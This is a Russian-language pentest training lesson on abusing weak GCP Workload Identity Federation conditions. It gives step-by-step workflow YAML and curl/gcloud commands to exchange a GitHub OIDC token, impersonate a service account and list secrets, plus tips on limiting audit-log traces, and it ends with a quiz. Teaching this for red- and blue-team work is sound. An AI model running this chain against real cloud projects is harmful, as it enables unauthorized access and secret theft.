---
id: cloud-gcp-wif
title: "Workload Identity Federation: подделка доверия внешнего IdP"
category: cloud
parent: cloud-gcp-deep
difficulty: hard
order: 3
tags: [cloud, gcp, workload-identity, federation, oidc, sts, impersonation]
prerequisites: [cloud-gcp-deep, cloud-gcp-iam]
useful_for:
  - "Атака на доверие CI/CD к GCP без статических ключей"
  - "Понимание OIDC/SAML-федерации в облаке"
  - "Пентест мульти-облачных пайплайнов"
estimated_minutes: 55
summary: "Как устроена Workload Identity Federation в GCP: пулы, провайдеры, маппинг атрибутов и условия. Как слабое условие доверия позволяет внешнему IdP получить GCP-токен и имперсонировать сервисный аккаунт."
---

## Задача

Организация `acme` настроила деплой из GitHub Actions в GCP через **Workload Identity Federation (WIF)** — без статических ключей, обменом короткоживущего токена. Ты хочешь получить доступ к GCP, не имея ни одного ключа. Возможно ли это? Да, если **условие доверия** настроено слабо. Задача урока — понять устройство WIF, найти слабое условие и пройти цепочку «внешний токен → GCP-токен → имперсонация SA».

## Что такое WIF и зачем он нужен

**WIF** позволяет внешним идентичностям — GitHub Actions, GitLab CI, AWS, Azure AD, Kubernetes — получать доступ к Google Cloud **без статических ключей**. Вместо `service-account-key.json` в секретах CI используется короткоживущий **OIDC-токен** (JWT), который обменивается на GCP-токен.

Компоненты:

- **Workload Identity Pool** — контейнер для внешних идентичностей.
- **Provider** — источник (OIDC, AWS, SAML). Для GitHub Actions issuer — `https://token.actions.githubusercontent.com`.
- **Attribute mapping** — как claims внешнего токена превращаются в `google.subject` и `attribute.*`. Например, `attribute.repository = assertion.repository`.
- **Attribute condition** — CEL-выражение, пропускающее только определённые токены, например `assertion.repository == 'acme/repo' && assertion.ref == 'refs/heads/main'`.

Вся безопасность держится на **условии**. Если оно слишком широкое — например, проверяет только организацию, но не конкретный репозиторий и ветку, — любой форк получит GCP-доступ.

## Поток обмена токена

1. Внешняя система выдаёт OIDC-токен (JWT) с `iss`, `aud`, `sub` и claims.
2. Вызов `sts.googleapis.com/v1/token` с grant-type `token-exchange` и subject-token = внешний JWT.
3. STS проверяет provider и condition, возвращает **federated access token**.
4. Имперсонация SA через `iamcredentials.googleapis.com` (нужно право `iam.workloadIdentityUser` на SA).

## Данные, с которыми работаем

Смотрим настройку провайдера (через утекший конфиг, публичный workflow или право `workloadIdentityPools.get`):

```bash
$ gcloud iam workload-identity-pools providers describe github \
    --workload-identity-pool=gh --location=global \
    --format='value(oidc.issuerUri,attributeCondition)'
https://token.actions.githubusercontent.com
assertion.repository_owner == 'acme'
```

Условие — `repository_owner == 'acme'`. Оно принимает токен от **любого** репозитория организации `acme`, включая форк. Это наша зацепка.

## Шаг 1: получаем OIDC-токен из своего workflow

Создаём (или форкаем) репозиторий под `acme` и запускаем workflow, который запрашивает OIDC-токен:

```yaml
permissions:
  id-token: write
  contents: read
jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - run: |
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=//iam.googleapis.com/projects/123456789/locations/global/workloadIdentityPools/gh/providers/github" | jq -r .value)
          echo "$TOKEN" > token.jwt
```

`ACTIONS_ID_TOKEN_REQUEST_URL` и `..._TOKEN` GitHub подставляет автоматически, если выдано разрешение `id-token: write`.

## Шаг 2: обмениваем на federated token

```bash
$ curl -s -X POST "https://sts.googleapis.com/v1/token" -H "Content-Type: application/json" -d '{
    "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
    "audience": "//iam.googleapis.com/projects/123456789/locations/global/workloadIdentityPools/gh/providers/github",
    "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt",
    "subjectToken": "'"$EXTERNAL_TOKEN"'",
    "scope": "https://www.googleapis.com/auth/cloud-platform"
  }' | jq -r '.access_token' | cut -c1-15
ya29.d.b0Aa
```

Условие прошло, потому что `repository_owner == 'acme'`. Мы получили federated token.

## Шаг 3: имперсонируем SA

Смотрим, кто имеет `workloadIdentityUser`:

```bash
$ gcloud iam service-accounts get-iam-policy app-gsa@my-project.iam.gserviceaccount.com \
    --format=json | jq '.bindings[] | select(.role=="roles/iam.workloadIdentityUser")'
{"role":"roles/iam.workloadIdentityUser","members":["principalSet://iam.googleapis.com/projects/123456789/locations/global/workloadIdentityPools/gh/*"]}
```

`*` — любой principal из пула. Имперсонируем:

```bash
$ curl -s -X POST -H "Authorization: Bearer $FEDERATED_TOKEN" -H "Content-Type: application/json" \
    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/app-gsa@my-project.iam.gserviceaccount.com:generateAccessToken" \
    -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' | jq -r '.accessToken' | cut -c1-15
ya29.c.b0Aa
```

## Шаг 4: действуем от имени SA

Теперь у нас токен `app-gsa`. Читаем Secrets, Storage или выпускаем ключ для персистентности:

```bash
$ curl -s -H "Authorization: Bearer $SA_TOKEN" \
    "https://secretmanager.googleapis.com/v1/projects/my-project/secrets"
```

## Полный прогон от начала до конца

1. `providers describe` → condition `repository_owner == 'acme'` (слабое).
2. Workflow в репозитории org → OIDC-токен.
3. STS `token-exchange` → federated token.
4. `generateAccessToken` → токен `app-gsa`.
5. От имени SA — Secrets/Storage/ключи.

## Если не сработало

- **Condition на конкретный репозиторий.** Тогда нужен доступ именно к нему (или PR/форк, если проверка не учитывает форки).
- **Нет `workloadIdentityUser`.** Имперсонация не сработает, даже если condition пройден.
- **Неправильный `aud`.** Exchange вернёт ошибку — audience должен совпадать с провайдером.
- **Подделка подписи.** Не пройдёт: STS проверяет подпись токена реального issuer.
- **AWS-провайдер.** Тогда нужны креды любого AWS-аккаунта, разрешённого в condition (проверяется `GetCallerIdentity`).
- **Пустой condition.** Принимается любой токен провайдера — самый простой случай.

## WIF в GKE и в других облаках

Кроме GitHub/GitLab, WIF используется для **GKE Workload Identity** (пул `<PROJECT>.svc.id.goog`): под имперсонирует GSA, и если маппинг KSA→GSA сделан на широкий GSA, компромисс пода даёт GCP-доступ. Провайдер **AWS→GCP** проверяет подпись `GetCallerIdentity`: любой, у кого есть креды разрешённого AWS-аккаунта, обменяет их на GCP-токен — поэтому condition по `aws:accountId` без ограничения роли слаб. **Azure→GCP** работает аналогично через OIDC Azure AD. Общее правило: чем меньше claim-ов проверяет condition, тем шире вход.

## OPSEC и что остаётся в логах

Обмен токена фиксируется в Cloud Audit Logs как `google.sts.v1.SecurityTokenService.ExchangeToken`, а имперсонация — как `GenerateAccessToken`/`GenerateIdToken` с principal вида `principalSet://.../workloadIdentityPools/...`. Эти записи — прямой след твоей цепочки. Практические соображения: минимизируй число обменов, не создавай новых пулов и провайдеров (это громкие `create`), не выпускай ключи SA без необходимости. Если для получения токена ты используешь форк репозитория, твой workflow останется и в логах GitHub. Для отчёта важно, что защита может детектировать exchange по неожиданным репозиториям или веткам.

## Типовые слабости условия

Список слабостей, которые ищем в первую очередь: condition проверяет только `assertion.repository_owner`, а не конкретный репозиторий; condition отсутствует вовсе (принимается любой токен провайдера); маппинг `google.subject` берёт нестабильный claim; провайдер не проверяет `aud`; роль `workloadIdentityUser` выдана на весь проект, а не на конкретный SA. Любая из них превращает «безключевой» доступ в открытую дверь.

## Что мы теперь знаем

- WIF обменивает внешний OIDC-токен на GCP-токен без статических ключей.
- Безопасность держится на attribute condition; слабое условие = вход.
- `repository_owner` без репозитория/ветки — классический мисконфиг.
- Federated token и impersonated token — разные вещи; для второго нужно `workloadIdentityUser`.
- Exchange и имперсонация пишутся в Cloud Audit Logs.

## На что смотреть дальше

- **cloud-gcp-iam**: роли и `setIamPolicy`.
- **cloud-cicd-github-actions**: атаки на сами пайплайны.
- **cloud-oidc-federation**: общая модель федерации в облаках.

## Квиз

Проверь себя.

```quiz
- question: "Что защищает Workload Identity Federation от произвольных внешних токенов?"
  options:
    - "Attribute condition (CEL-выражение)"
    - "Пароль сервисного аккаунта"
    - "SAS-токен"
    - "IMDSv2"
  answer: 0
  explanation: "Condition фильтрует, какие внешние токены принимаются."
- question: "Какой condition самый слабый?"
  options:
    - "assertion.repository_owner == 'acme'"
    - "assertion.repository == 'acme/repo' && assertion.ref == 'refs/heads/main'"
    - "assertion.repository == 'acme/repo'"
    - "assertion.sub == 'repo:acme/repo:ref:refs/heads/main'"
  answer: 0
  explanation: "Проверка только владельца допускает любой репозиторий организации."
- question: "Какое право нужно для имперсонации SA после обмена токена?"
  options:
    - "iam.workloadIdentityUser на сервисный аккаунт"
    - "storage.objects.get"
    - "compute.instances.get"
    - "logging.viewer"
  answer: 0
  explanation: "workloadIdentityUser (или roles/iam.workloadIdentityUser) разрешает имперсонацию."
- question: "Что проверяет провайдер типа AWS в GCP WIF?"
  options:
    - "Подпись GetCallerIdentity от AWS"
    - "Пароль AWS"
    - "SAS-токен"
    - "JWT от GitHub"
  answer: 0
  explanation: "AWS-провайдер валидирует ответ sts:GetCallerIdentity, подтверждая AWS-идентичность."
- question: "Чем federated token отличается от impersonated token?"
  options:
    - "Первый выдан STS и ограничен правами на имперсонацию, второй — от iamcredentials"
    - "Это одно и то же"
    - "Первый долгоживущий"
    - "Второй не требует прав"
  answer: 0
  explanation: "Обмен даёт federated token; имперсонация SA — отдельный вызов iamcredentials."
```

## Куда дальше

В следующем уроке мы разберём **GCP IAM** подробнее — роли, `setIamPolicy` и имперсонацию. А пока главное запомни: **WIF — это доверие, и если condition проверяет только организацию, любой репозиторий в ней открывает GCP.**

## Где пригодится

- **Red team:** атака на CI/CD, доверяющий GCP без ключей.
- **Пентест GCP:** анализ федерации и имперсонации.
- **Bug bounty:** мисконфиги WIF в публичных репозиториях.
- **Blue team:** аудит условий доверия и алерты на exchange.
